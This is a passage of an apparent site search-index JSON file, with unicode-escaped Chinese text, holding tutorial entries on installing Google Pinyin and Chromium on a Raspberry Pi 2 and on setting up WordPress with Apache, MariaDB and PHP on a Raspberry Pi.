http://arondight.me/2016/02/17/\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f/","title":"\u6700\u7ec8\u7684\u89e3\u51b3\u65b9\u6848"},{"location":"RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/","text":"\u5728\u6811\u8393\u6d3e2\u4e0a\u5b89\u88c5 Chromium \u6d4f\u89c8\u5668\u53ca Google \u62fc\u97f3\u8f93\u5165\u6cd5 \u6811\u8393\u6d3e\u7cfb\u7edf\u5b89\u88c5\u597d\u4e4b\u540e\u8fd8\u8981\u88c5\u4e0a\u4e00\u4e9b\u5fc5\u987b\u7684\u7684\u5de5\u5177\u624d\u80fd\u7528\u554a\uff0c\u6bd4\u5982\u8bf4\u4e2d\u6587\u8f93\u5165\u6cd5\u548c\u6d4f\u89c8\u5668\u3002 Ubuntu Mate for Raspberry Pi 2 \u867d\u7136\u652f\u6301\u4e2d\u6587\uff0c\u4f46\u662f\u662f\u6ca1\u6709\u4e2d\u6587\u8f93\u5165\u6cd5\u7684\uff0c\u4e8e\u662f\u6211\u4eec\u9700\u8981\u81ea\u5df1\u5b89\u88c5\u4e00\u4e2a\u3002 \u6211\u5b89\u88c5\u4e86 Google \u62fc\u97f3\uff0c\u4e00\u4e2a\u547d\u4ee4\u5c31\u53ef\u4ee5\u88c5\u597d fcitx \u548c Google \u62fc\u97f3\u3002 sudo apt-get install fcitx fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sunpinyin \u91cd\u542f\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e2d\u6587\u8f93\u5165\u6cd5\u4e86\u3002\u8fd9\u7bc7\u7684\u4e1c\u897f\u5c31\u662f\u5728\u6811\u8393\u6d3e\u4e0a\u7528 Google \u62fc\u97f3\u6572\u51fa\u6765\u7684:) \u7cfb\u7edf\u81ea\u5e26\u7684\u662f FireFox\uff0c\u7528\u8d77\u6765\u4e5f\u8fd8\u633a\u6d41\u7545\uff0c\u4f46\u662f\u6211\u4e2a\u4eba\u4e60\u60ef\u7528 Chrome\uff0c\u4e8e\u662f\u6211\u5b89\u88c5\u4e86 Chromium \u6d4f\u89c8\u5668\u3002 Ubuntu Mate \u81ea\u5e26\u7684\u6e90\u91cc\u662f\u6ca1\u6709 Chromium \u7684\uff0c\u4e8e\u662f\u6211\u4eec\u8981\u5148\u6dfb\u52a0\u4e00\u4e2a\u6e90\uff0c\u7528\u4ee5\u4e0b\u547d\u4ee4\u3002 sudo tee /etc/apt/sources.list.d/i386.list deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi \u7136\u540e\u5c31\u53ef\u4ee5\u5b89\u88c5 Chromium \u4e86\uff1a sudo apt-get install chromium \u539f\u6587\u94fe\u63a5\uff1a https://yian.me/blog/cs/install-chromium-and-google-pinyin-on-raspberry-pi-2.html","title":"\u5728\u6811\u8393\u6d3e2\u4e0a\u5b89\u88c5 Chromium \u6d4f\u89c8\u5668\u53ca Google \u62fc\u97f3\u8f93\u5165\u6cd5"},{"location":"RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/#2-chromium-google","text":"\u6811\u8393\u6d3e\u7cfb\u7edf\u5b89\u88c5\u597d\u4e4b\u540e\u8fd8\u8981\u88c5\u4e0a\u4e00\u4e9b\u5fc5\u987b\u7684\u7684\u5de5\u5177\u624d\u80fd\u7528\u554a\uff0c\u6bd4\u5982\u8bf4\u4e2d\u6587\u8f93\u5165\u6cd5\u548c\u6d4f\u89c8\u5668\u3002 Ubuntu Mate for Raspberry Pi 2 \u867d\u7136\u652f\u6301\u4e2d\u6587\uff0c\u4f46\u662f\u662f\u6ca1\u6709\u4e2d\u6587\u8f93\u5165\u6cd5\u7684\uff0c\u4e8e\u662f\u6211\u4eec\u9700\u8981\u81ea\u5df1\u5b89\u88c5\u4e00\u4e2a\u3002 \u6211\u5b89\u88c5\u4e86 Google \u62fc\u97f3\uff0c\u4e00\u4e2a\u547d\u4ee4\u5c31\u53ef\u4ee5\u88c5\u597d fcitx \u548c Google \u62fc\u97f3\u3002 sudo apt-get install fcitx fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sunpinyin \u91cd\u542f\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e2d\u6587\u8f93\u5165\u6cd5\u4e86\u3002\u8fd9\u7bc7\u7684\u4e1c\u897f\u5c31\u662f\u5728\u6811\u8393\u6d3e\u4e0a\u7528 Google \u62fc\u97f3\u6572\u51fa\u6765\u7684:) \u7cfb\u7edf\u81ea\u5e26\u7684\u662f FireFox\uff0c\u7528\u8d77\u6765\u4e5f\u8fd8\u633a\u6d41\u7545\uff0c\u4f46\u662f\u6211\u4e2a\u4eba\u4e60\u60ef\u7528 Chrome\uff0c\u4e8e\u662f\u6211\u5b89\u88c5\u4e86 Chromium \u6d4f\u89c8\u5668\u3002 Ubuntu Mate \u81ea\u5e26\u7684\u6e90\u91cc\u662f\u6ca1\u6709 Chromium \u7684\uff0c\u4e8e\u662f\u6211\u4eec\u8981\u5148\u6dfb\u52a0\u4e00\u4e2a\u6e90\uff0c\u7528\u4ee5\u4e0b\u547d\u4ee4\u3002 sudo tee /etc/apt/sources.list.d/i386.list deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi \u7136\u540e\u5c31\u53ef\u4ee5\u5b89\u88c5 Chromium \u4e86\uff1a sudo apt-get install chromium \u539f\u6587\u94fe\u63a5\uff1a https://yian.me/blog/cs/install-chromium-and-google-pinyin-on-raspberry-pi-2.html","title":"\u5728\u6811\u8393\u6d3e2\u4e0a\u5b89\u88c5 Chromium \u6d4f\u89c8\u5668\u53ca Google \u62fc\u97f3\u8f93\u5165\u6cd5"},{"location":"RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/","text":"\u5982\u4f55\u5728\u6811\u8393\u6d3e\u4e0a\u642d\u5efa WordPress \u8fd9\u7bc7\u7b80\u5355\u7684\u6559\u7a0b\u53ef\u4ee5\u8ba9\u4f60\u5728\u6811\u8393\u6d3e\u4e0a\u8fd0\u884c\u4f60\u7684 WordPress \u7f51\u7ad9\u3002 WordPress \u662f\u4e00\u4e2a\u975e\u5e38\u53d7\u6b22\u8fce\u7684\u5f00\u6e90\u535a\u5ba2\u5e73\u53f0\u548c\u5185\u5bb9\u7ba1\u7406\u5e73\u53f0\uff08CMS)\u3002\u5b83\u5f88\u5bb9\u6613\u642d\u5efa\uff0c\u800c\u4e14\u8fd8\u6709\u4e00\u4e2a\u6d3b\u8dc3\u7684\u5f00\u53d1\u8005\u793e\u533a\u6784\u5efa\u7f51\u7ad9\u3001\u521b\u5efa\u4e3b\u9898\u548c\u63d2\u4ef6\u4f9b\u5176\u4ed6\u4eba\u4f7f\u7528\u3002 \u867d\u7136\u901a\u8fc7\u4e00\u952e\u5f0f WordPress \u8bbe\u7f6e\u83b7\u5f97\u6258\u7ba1\u5305\u5f88\u5bb9\u6613\uff0c\u4f46\u4e5f\u53ef\u4ee5\u7b80\u5355\u5730\u901a\u8fc7\u547d\u4ee4\u884c\u5728 Linux \u670d\u52a1\u5668\u4e0a\u8bbe\u7f6e\u81ea\u5df1\u7684\u6258\u7ba1\u5305\uff0c\u800c\u4e14\u6811\u8393\u6d3e\u662f\u4e00\u79cd\u7528\u6765\u5c1d\u8bd5\u5b83\u5e76\u987a\u4fbf\u5b66\u4e60\u4e00\u4e9b\u4e1c\u897f\u7684\u76f8\u5f53\u597d\u7684\u9014\u5f84\u3002 \u4e00\u4e2a\u7ecf\u5e38\u4f7f\u7528\u7684 Web \u5957\u4ef6\u7684\u56db\u4e2a\u90e8\u5206\u662f Linux\u3001Apache\u3001MySQL \u548c PHP\u3002\u8fd9\u91cc\u662f\u4f60\u5bf9\u5b83\u4eec\u6bcf\u4e00\u4e2a\u9700\u8981\u4e86\u89e3\u7684\u3002 Linux \u6811\u8393\u6d3e\u4e0a\u8fd0\u884c\u7684\u7cfb\u7edf\u662f Raspbian\uff0c\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8e Debian\uff0c\u4e3a\u8fd0\u884c\u5728\u6811\u8393\u6d3e\u786c\u4ef6\u4e0a\u800c\u4f18\u5316\u7684\u5f88\u597d\u7684 Linux \u53d1\u884c\u7248\u3002\u4f60\u6709\u4e24\u4e2a\u9009\u62e9\uff1a\u684c\u9762\u7248\u6216\u662f\u7cbe\u7b80\u7248\u3002\u684c\u9762\u7248\u6709\u4e00\u4e2a\u719f\u6089\u7684\u684c\u9762\u8fd8\u6709\u5f88\u591a\u6559\u80b2\u8f6f\u4ef6\u548c\u7f16\u7a0b\u5de5\u5177\uff0c\u50cf\u662f LibreOffice \u5957\u4ef6\u3001Mincraft\uff0c\u8fd8\u6709\u4e00\u4e2a web \u6d4f\u89c8\u5668\u3002\u7cbe\u7b80\u7248\u672c\u6ca1\u6709\u684c\u9762\u73af\u5883\uff0c\u56e0\u6b64\u5b83\u53ea\u6709\u547d\u4ee4\u884c\u4ee5\u53ca\u4e00\u4e9b\u5fc5\u8981\u7684\u8f6f\u4ef6\u3002 \u8fd9\u7bc7\u6559\u7a0b\u5728\u4e24\u4e2a\u7248\u672c\u4e0a\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u4f46\u662f\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u7cbe\u7b80\u7248\uff0c\u4f60\u5fc5\u987b\u8981\u6709\u53e6\u5916\u4e00\u53f0\u7535\u8111\u53bb\u8bbf\u95ee\u4f60\u7684\u7ad9\u70b9\u3002 Apache Apache \u662f\u4e00\u4e2a\u53d7\u6b22\u8fce\u7684 web \u670d\u52a1\u5668\u5e94\u7528\uff0c\u4f60\u53ef\u4ee5\u5b89\u88c5\u5728\u4f60\u7684\u6811\u8393\u6d3e\u4e0a\u4f3a\u670d\u4f60\u7684 web \u9875\u9762\u3002\u5c31\u5176\u81ea\u8eab\u800c\u8a00\uff0cApache \u53ef\u4ee5\u901a\u8fc7 HTTP \u63d0\u4f9b\u9759\u6001 HTML \u6587\u4ef6\u3002\u4f7f\u7528\u989d\u5916\u7684\u6a21\u5757\uff0c\u5b83\u4e5f\u53ef\u4ee5\u4f7f\u7528\u50cf\u662f PHP \u7684\u811a\u672c\u8bed\u8a00\u63d0\u4f9b\u52a8\u6001\u7f51\u9875\u3002 \u5b89\u88c5 Apache \u975e\u5e38\u7b80\u5355\u3002\u6253\u5f00\u4e00\u4e2a\u7ec8\u7aef\u7a97\u53e3\uff0c\u7136\u540e\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\uff1a sudo apt install apache2 -y Apache \u9ed8\u8ba4\u653e\u4e86\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6\u5728\u4e00\u4e2a web \u76ee\u5f55\u4e2d\uff0c\u4f60\u53ef\u4ee5\u4ece\u4f60\u7684\u7535\u8111\u6216\u662f\u4f60\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u8ba1\u7b97\u673a\u8fdb\u884c\u8bbf\u95ee\u3002\u53ea\u9700\u8981\u6253\u5f00 web \u6d4f\u89c8\u5668\uff0c\u7136\u540e\u8f93\u5165\u5730\u5740 <http://localhost> \u3002\u6216\u8005\uff08\u7279\u522b\u662f\u4f60\u4f7f\u7528\u7684\u662f Raspbian Lite \u7684\u8bdd\uff09\u8f93\u5165\u4f60\u7684\u6811\u8393\u6d3e\u7684 IP \u5730\u5740\u4ee3\u66ff localhost \u3002\u4f60\u5e94\u8be5\u4f1a\u5728\u4f60\u7684\u6d4f\u89c8\u5668\u7a97\u53e3\u4e2d\u770b\u5230\u8fd9\u6837\u7684\u5185\u5bb9\uff1a \u8fd9\u610f\u5473\u7740\u4f60\u7684 Apache \u5df2\u7ecf\u5f00\u59cb\u5de5\u4f5c\u4e86\uff01 \u8fd9\u4e2a\u9ed8\u8ba4\u7684\u7f51\u9875\u4ec5\u4ec5\u662f\u4f60\u6587\u4ef6\u7cfb\u7edf\u91cc\u7684\u4e00\u4e2a\u6587\u4ef6\u3002\u5b83\u5728\u4f60\u672c\u5730\u7684 /var/www/html/index/html \u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 Leafpad \u6587\u672c\u7f16\u8f91\u5668\u5199\u4e00\u4e9b HTML \u53bb\u66ff\u6362\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002 cd /var/www/html/ sudo leafpad index.html \u4fdd\u5b58\u5e76\u5173\u95ed Leafpad \u7136\u540e\u5237\u65b0\u7f51\u9875\uff0c\u67e5\u770b\u4f60\u7684\u66f4\u6539\u3002 MySQL MySQL\uff08\u8bfb\u4f5c \u201cmy S-Q-L\u201d \u6216\u8005 \u201cmy sequel\u201d\uff09\u662f\u4e00\u4e2a\u5f88\u53d7\u6b22\u8fce\u7684\u6570\u636e\u5e93\u5f15\u64ce\u3002\u5c31\u50cf PHP\uff0c\u5b83\u88ab\u975e\u5e38\u5e7f\u6cdb\u7684\u5e94\u7528\u4e8e\u7f51\u9875\u670d\u52a1\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u50cf WordPress \u4e00\u6837\u7684\u9879\u76ee\u9009\u62e9\u4e86\u5b83\uff0c\u4ee5\u53ca\u8fd9\u4e9b\u9879\u76ee\u662f\u4e3a\u4f55\u5982\u6b64\u53d7\u6b22\u8fce\u3002 \u5728\u4e00\u4e2a\u7ec8\u7aef\u7a97\u53e3\u4e2d\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5 MySQL \u670d\u52a1\uff08LCTT \u8bd1\u6ce8\uff1a\u5b9e\u9645\u4e0a\u5b89\u88c5\u7684\u662f MySQL \u5206\u652f MariaDB\uff09\uff1a sudo apt-get install mysql-server -y WordPress \u4f7f\u7528 MySQL \u5b58\u50a8\u6587\u7ae0\u3001\u9875\u9762\u3001\u7528\u6237\u6570\u636e\u3001\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u7684\u5185\u5bb9\u3002 PHP PHP \u662f\u4e00\u4e2a\u9884\u5904\u7406\u5668\uff1a\u5b83\u662f\u5728\u670d\u52a1\u5668\u901a\u8fc7\u7f51\u7edc\u6d4f\u89c8\u5668\u63a5\u53d7\u7f51\u9875\u8bf7\u6c42\u662f\u8fd0\u884c\u7684\u4ee3\u7801\u3002\u5b83\u89e3\u51b3\u90a3\u4e9b\u9700\u8981\u5c55\u793a\u5728\u7f51\u9875\u4e0a\u7684\u5185\u5bb9\uff0c\u7136\u540e\u53d1\u9001\u8fd9\u4e9b\u7f51\u9875\u5230\u6d4f\u89c8\u5668\u4e0a\u3002\u4e0d\u50cf\u9759\u6001\u7684 HTML\uff0cPHP \u80fd\u5728\u4e0d\u540c\u7684\u60c5\u51b5\u4e0b\u5c55\u793a\u4e0d\u540c\u7684\u5185\u5bb9\u3002PHP \u662f\u4e00\u4e2a\u5728 web \u4e0a\u975e\u5e38\u53d7\u6b22\u8fce\u7684\u8bed\u8a00\uff1b\u5f88\u591a\u50cf Facebook \u548c Wikipedia \u7684\u9879\u76ee\u90fd\u4f7f\u7528 PHP \u7f16\u5199\u3002 \u5b89\u88c5 PHP \u548c MySQL \u7684\u63d2\u4ef6\uff1a sudo apt-get install php php-mysql -y \u5220\u9664 index.html \uff0c\u7136\u540e\u521b\u5efa index.php \uff1a sudo rm index.html sudo leafpad index.php \u5728\u91cc\u9762\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9\uff1a <?php phpinfo(); ?> \u4fdd\u5b58\u3001\u9000\u51fa\u3001\u5237\u65b0\u4f60\u7684\u7f51\u9875\u3002\u4f60\u5c06\u4f1a\u770b\u5230 PHP \u72b6\u6001\u9875\uff1a WordPress \u4f60\u53ef\u4ee5\u4f7f\u7528 wget \u547d\u4ee4\u4ece wordpress.org \u4e0b\u8f7d WordPress\u3002\u6700\u65b0\u7684 WordPress \u603b\u662f\u4f7f\u7528 wordpress.org/latest.tar.gz \u8fd9\u4e2a\u7f51\u5740\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u76f4\u63a5\u6293\u53d6\u8fd9\u4e9b\u6587\u4ef6\uff0c\u800c\u65e0\u9700\u5230\u7f51\u9875\u91cc\u9762\u67e5\u770b\uff0c\u73b0\u5728\u7684\u7248\u672c\u662f 4.9.8\u3002 \u786e\u4fdd\u4f60\u5728 /var/www/html \u76ee\u5f55\u4e2d\uff0c\u7136\u540e\u5220\u9664\u91cc\u9762\u7684\u6240\u6709\u5185\u5bb9\uff1a cd /var/www/html/ sudo rm * \u4f7f\u7528 wget \u4e0b\u8f7d WordPress\uff0c\u7136\u540e\u63d0\u53d6\u91cc\u9762\u7684\u5185\u5bb9\uff0c\u5e76\u79fb\u52a8\u63d0\u53d6\u7684 WordPress \u76ee\u5f55\u4e2d\u7684\u5185\u5bb9\u79fb\u52a8\u5230 html \u76ee\u5f55\u4e0b\uff1a sudo wget http://wordpress.org/latest.tar.gz sudo tar xzf latest.tar.gz sudo mv wordpress/* . \u73b0\u5728\u53ef\u4ee5\u5220\u9664\u538b\u7f29\u5305\u548c\u7a7a\u7684 wordpress \u76ee\u5f55\u4e86\uff1a sudo rm -rf wordpress latest.tar.gz \u8fd0\u884c ls \u6216\u8005 tree -L 1 \u547d\u4ee4\u663e\u793a WordPress \u9879\u76ee\u4e0b\u5305\u542b\u7684\u5185\u5bb9\uff1a . \u251c\u2500\u2500 index.php \u251c\u2500\u2500 license.txt \u251c\u2500\u2500 readme.html \u251c\u2500\u2500 wp-activate.php \u251c\u2500\u2500 wp-admin \u251c\u2500\u2500 wp-blog-header.php \u251c\u2500\u2500 wp-comments-post.php \u251c\u2500\u2500 wp-config-sample.php \u251c\u2500\u2500 wp-content \u251c\u2500\u2500 wp-cron.php \u251c\u2500\u2500 wp-includes \u251c\u2500\u2500 wp-links-opml.php \u251c\u2500\u2500 wp-load.php \u251c\u2500\u2500 wp-login.php \u251c\u2500\u2500 wp-mail.php \u251c\u2500\u2500 wp-settings.php \u251c\u2500\u2500 wp-signup.php \u251c\u2500\u2500 wp-trackback.php \u2514\u2500\u2500 xmlrpc.php 3 directories, 16 files \u8fd9\u662f WordPress \u7684\u9ed8\u8ba4\u5b89\u88c5\u6e90\u3002\u5728 wp-content \u76ee\u5f55\u4e2d\uff0c\u4f60\u53ef\u4ee5\u7f16\u8f91\u4f60\u7684\u81ea\u5b9a\u4e49\u5b89\u88c5\u3002 \u4f60\u73b0\u5728\u5e94\u8be5\u628a\u6240\u6709\u6587\u4ef6\u7684\u6240\u6709\u6743\u6539\u4e3a Apache \u7684\u8fd0\u884c\u7528\u6237 www-data \uff1a sudo chown -R www-data: . WordPress \u6570\u636e\u5e93 \u4e3a\u4e86\u642d\u5efa\u4f60\u7684 WordPress \u7ad9\u70b9\uff0c\u4f60\u9700\u8981\u4e00\u4e2a\u6570\u636e\u5e93\u3002\u8fd9\u91cc\u4f7f\u7528\u7684\u662f MySQL\u3002 \u5728\u7ec8\u7aef\u7a97\u53e3\u8fd0\u884c MySQL \u7684\u5b89\u5168\u5b89\u88c5\u547d\u4ee4\uff1a sudo mysql_secure_installation \u4f60\u5c06\u4f1a\u88ab\u95ee\u5230\u4e00\u7cfb\u5217\u7684\u95ee\u9898\u3002\u8fd9\u91cc\u539f\u6765\u6ca1\u6709\u8bbe\u7f6e\u5bc6\u7801\uff0c\u4f46\u662f\u5728\u4e0b\u4e00\u6b65\u4f60\u5e94\u8be5\u8bbe\u7f6e\u4e00\u4e2a\u3002\u786e\u4fdd\u4f60\u8bb0\u4f4f\u4e86\u4f60\u8f93\u5165\u7684\u5bc6\u7801\uff0c\u540e\u9762\u4f60\u9700\u8981\u4f7f\u7528\u5b83\u53bb\u8fde\u63a5\u4f60\u7684 WordPress\u3002\u6309\u56de\u8f66\u786e\u8ba4\u4e0b\u9762\u7684\u6240\u6709\u95ee\u9898\u3002 \u5f53\u5b83\u5b8c\u6210\u4e4b\u540e\uff0c\u4f60\u5c06\u4f1a\u770b\u5230 \u201cAll done!\u201d \u548c \u201cThanks for using MariaDB!\u201d \u7684\u4fe1\u606f\u3002 \u5728\u7ec8\u7aef\u7a97\u53e3\u8fd0\u884c mysql \u547d\u4ee4\uff1a sudo mysql -uroot -p \u8f93\u5165\u4f60\u521b\u5efa\u7684 root \u5bc6\u7801\uff08LCTT \u8bd1\u6ce8\uff1a\u4e0d\u662f Linux \u7cfb\u7edf\u7684 root \u5bc6\u7801\uff0c\u662f MySQL \u7684 root \u5bc6\u7801\uff09\u3002\u4f60\u5c06\u770b\u5230 \u201cWelcome to the MariaDB monitor.\u201d \u7684\u6b22\u8fce\u4fe1\u606f\u3002\u5728 \u201cMariaDB [(none)] >\u201d \u63d0\u793a\u5904\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff0c\u4e3a\u4f60 WordPress \u7684\u5b89\u88c5\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93\uff1a create database wordpress; \u6ce8\u610f\u58f0\u660e\u6700\u540e\u7684\u5206\u53f7\uff0c\u5982\u679c\u547d\u4ee4\u6267\u884c\u6210\u529f\uff0c\u4f60\u5c06\u770b\u5230\u4e0b\u9762\u7684\u63d0\u793a\uff1a Query OK, 1 row affected (0.00 sec) \u628a\u6570\u636e\u5e93\u6743\u9650\u4ea4\u7ed9 root \u7528\u6237\u5728\u58f0\u660e\u7684\u5e95\u90e8\u8f93\u5165\u5bc6\u7801\uff1a GRANT ALL PRIVILEGES ON wordpress.* TO 'root'@'localhost' IDENTIFIED BY 'YOURPASSWORD'; \u4e3a\u4e86\u8ba9\u66f4\u6539\u751f\u6548\uff0c\u4f60\u9700\u8981\u5237\u65b0\u6570\u636e\u5e93\u6743\u9650\uff1a FLUSH PRIVILEGES; \u6309 Ctrl+D \u9000\u51fa MariaDB \u63d0\u793a\u7b26\uff0c\u8fd4\u56de\u5230 Bash shell\u3002 WordPress \u914d\u7f6e \u5728\u4f60\u7684 \u6811\u8393\u6d3e \u6253\u5f00\u7f51\u9875\u6d4f\u89c8\u5668\uff0c\u5730\u5740\u680f\u8f93\u5165 http://localhost \u3002\u9009\u62e9\u4e00\u4e2a\u4f60\u60f3\u8981\u5728 WordPress \u4f7f\u7528\u7684\u8bed\u8a00\uff0c\u7136\u540e\u70b9\u51fb\u201cContinue\u201d\u3002\u4f60\u5c06\u4f1a\u770b\u5230 WordPress \u7684\u6b22\u8fce\u754c\u9762\u3002\u70b9\u51fb \u201cLet\u2019s go!\u201d \u6309\u94ae\u3002 \u6309\u7167\u4e0b\u9762\u8fd9\u6837\u586b\u5199\u57fa\u672c\u7684\u7ad9\u70b9\u4fe1\u606f\uff1a Database Name: wordpress User Name: root Password: <YOUR PASSWORD> Database Host: localhost Table Prefix: wp_ \u70b9\u51fb \u201cSubmit\u201d \u7ee7\u7eed\uff0c\u7136\u540e\u70b9\u51fb \u201cRun the install\u201d\u3002 \u6309\u4e0b\u9762\u7684\u683c\u5f0f\u586b\u5199\uff1a\u4e3a\u4f60\u7684\u7ad9\u70b9\u8bbe\u7f6e\u4e00\u4e2a\u6807\u9898\u3001\u521b\u5efa\u4e00\u4e2a\u7528\u6237\u540d\u548c\u5bc6\u7801\u3001\u8f93\u5165\u4f60\u7684 email \u5730\u5740\u3002\u70b9\u51fb \u201cInstall WordPress\u201d \u6309\u94ae\uff0c\u7136\u540e\u4f7f\u7528\u4f60\u521a\u521a\u521b\u5efa\u7684\u8d26\u53f7\u767b\u5f55\uff0c\u4f60\u73b0\u5728\u5df2\u7ecf\u767b\u5f55\uff0c\u800c\u4e14\u4f60\u7684\u7ad9\u70b9\u5df2\u7ecf\u8bbe\u7f6e\u597d\u4e86\uff0c\u4f60\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u8f93\u5165 http://localhost/wp-admin \u67e5\u770b\u4f60\u7684\u7f51\u7ad9\u3002 \u6c38\u4e45\u94fe\u63a5 \u66f4\u6539\u4f60\u7684\u6c38\u4e45\u94fe\u63a5\u8bbe\u7f6e\uff0c\u4f7f\u5f97\u4f60\u7684 URL \u66f4\u52a0\u53cb\u597d\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u60f3\u6cd5\u3002 \u8981\u8fd9\u6837\u505a\uff0c\u9996\u5148\u767b\u5f55\u4f60\u7684 WordPress \uff0c\u8fdb\u5165\u4eea\u8868\u76d8\u3002\u8fdb\u5165 \u201cSettings\u201d\uff0c\u201cPermalinks\u201d\u3002\u9009\u62e9 \u201cPost name\u201d \u9009\u9879\uff0c\u7136\u540e\u70b9\u51fb \u201cSave Changes\u201d\u3002\u63a5\u7740\u4f60\u9700\u8981\u5f00\u542f Apache \u7684 rewrite \u6a21\u5757\u3002 sudo a2enmod rewrite \u4f60\u8fd8\u9700\u8981\u544a\u8bc9\u865a\u62df\u6258\u7ba1\u670d\u52a1\uff0c\u7ad9\u70b9\u5141\u8bb8\u6539\u5199\u8bf7\u6c42\u3002\u4e3a\u4f60\u7684\u865a\u62df\u4e3b\u673a\u7f16\u8f91 Apache \u914d\u7f6e\u6587\u4ef6\uff1a sudo leafpad /etc/apache2/sites-available/000-default.conf \u5728\u7b2c\u4e00\u884c\u540e\u6dfb\u52a0\u4e0b\u9762\u7684\u5185\u5bb9\uff1a <Directory \"/var/www/html\"> AllowOverride All </Directory> \u786e\u4fdd\u5176\u4e2d\u6709\u50cf\u8fd9\u6837\u7684\u5185\u5bb9 <VirtualHost *:80> \uff1a <VirtualHost *:80> <Directory \"/var/www/html\"> AllowOverride All </Directory> ... \u4fdd\u5b58\u8fd9\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u9000\u51fa\uff0c\u91cd\u542f Apache\uff1a sudo systemctl restart apache2 \u4e0b\u4e00\u6b65\uff1f WordPress \u662f\u53ef\u4ee5\u9ad8\u5ea6\u81ea\u5b9a\u4e49\u7684\u3002\u5728\u7f51\u7ad9\u9876\u90e8\u6a2a\u5e45\u5904\u70b9\u51fb\u4f60\u7684\u7ad9\u70b9\u540d\uff0c\u4f60\u5c31\u4f1a\u8fdb\u5165\u4eea\u8868\u76d8\u3002\u5728\u8fd9\u91cc\u4f60\u53ef\u4ee5\u4fee\u6539\u4e3b\u9898\u3001\u6dfb\u52a0\u9875\u9762\u548c\u6587\u7ae0\u3001\u7f16\u8f91\u83dc\u5355\u3001\u6dfb\u52a0\u63d2\u4ef6\u3001\u4ee5\u53ca\u8bb8\u591a\u5176\u4ed6\u7684\u4e8b\u60c5\u3002 \u8fd9\u91cc\u6709\u4e00\u4e9b\u4f60\u53ef\u4ee5\u5728\u6811\u8393\u6d3e\u7684\u7f51\u9875\u670d\u52a1\u4e0a\u5c1d\u8bd5\u7684\u6709\u8da3\u7684\u4e8b\u60c5\uff1a \u6dfb\u52a0\u9875\u9762\u548c\u6587\u7ae0\u5230\u4f60\u7684\u7f51\u7ad9 \u4ece\u5916\u89c2\u83dc\u5355\u5b89\u88c5\u4e0d\u540c\u7684\u4e3b\u9898 \u81ea\u5b9a\u4e49\u4f60\u7684\u7f51\u7ad9\u4e3b\u9898\u6216\u662f\u521b\u5efa\u4f60\u81ea\u5df1\u7684 \u4f7f\u7528\u4f60\u7684\u7f51\u7ad9\u670d\u52a1\u5411\u4f60\u7684\u7f51\u7edc\u4e0a\u7684\u5176\u4ed6\u4eba\u663e\u793a\u6709\u7528\u7684\u4fe1\u606f \u4e0d\u8981\u5fd8\u8bb0\uff0c\u6811\u8393\u6d3e\u662f\u4e00\u53f0 Linux \u7535\u8111\u3002\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u7ed3\u6784\u5728\u8fd0\u884c\u7740 Debian \u6216\u8005 Ubuntu \u7684\u670d\u52a1\u5668\u4e0a\u5b89\u88c5 WordPress\u3002 via: https://opensource.com/article/18/10/setting-wordpress-raspberry-pi \u539f\u6587\u94fe\u63a5\uff1a https://linux.cn/article-10208-1.html","title":"\u5982\u4f55\u5728\u6811\u8393\u6d3e\u4e0a\u642d\u5efa 